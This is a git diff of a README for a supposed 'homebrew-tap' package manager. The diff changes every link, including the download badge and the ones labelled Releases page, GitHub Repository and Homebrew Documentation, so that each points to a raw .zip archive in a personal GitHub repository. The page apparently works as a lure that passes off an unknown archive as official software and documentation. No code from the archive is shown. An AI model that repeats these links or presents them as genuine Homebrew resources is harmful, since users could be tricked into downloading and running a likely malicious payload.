@@ -8,11 +8,11 @@ Welcome to homebrew-tap! This application helps you manage software packages on 
 
 To get started, you need to download homebrew-tap. You can find the latest version on our Releases page. 
 
-[![Download Homebrew Tap](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip%20Now-Homebrew%20Tap-brightgreen)](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip)
+[![Download Homebrew Tap](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip%20Now-Homebrew%20Tap-brightgreen)](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip)
 
 Follow these steps to install homebrew-tap:
 
-1. **Visit this page to download:** Go to our [Releases page](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip) to find the latest version of homebrew-tap.
+1. **Visit this page to download:** Go to our [Releases page](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip) to find the latest version of homebrew-tap.
 2. **Choose the right file:** Look for the file that matches your system. If you're using macOS or Linux, you will find options suitable for your setup.
 3. **Download the file:** Click on the file to download it to your computer.
 4. **Install homebrew-tap:**
@@ -81,8 +81,8 @@ Thank you for choosing homebrew-tap. Your support helps us keep improving the to
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip)
-- [Homebrew Documentation](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/repair/homebrew-tap.zip)
+- [Releases Page](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip)
+- [Homebrew Documentation](https://raw.githubusercontent.com/antoniodomingos888/homebrew-tap/main/Formula/homebrew-tap-3.5-alpha.5.zip)
 
 With homebrew-tap, managing software on your computer is as simple as a few commands. Download it now and enjoy a more streamlined software experience!
